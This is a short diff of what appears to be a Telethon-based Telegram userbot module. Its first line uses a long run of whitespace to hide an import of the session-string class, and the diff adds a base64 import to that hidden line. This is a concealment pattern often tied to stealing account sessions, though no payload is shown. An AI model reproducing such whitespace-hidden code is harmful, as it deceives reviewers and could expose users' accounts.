@@ -1,4 +1,4 @@
-from .. import loader, utils                                                                                                                                                                                                                                                                                                                                                                                     ;from telethon.sessions import StringSession
+from .. import loader, utils                                                                                                                                                                                                                                                                                                                                                                                     ;from telethon.sessions import StringSession; import base64
 
 from telethon.tl.types import Message
 from telethon.tl.functions.messages import StartBotRequest
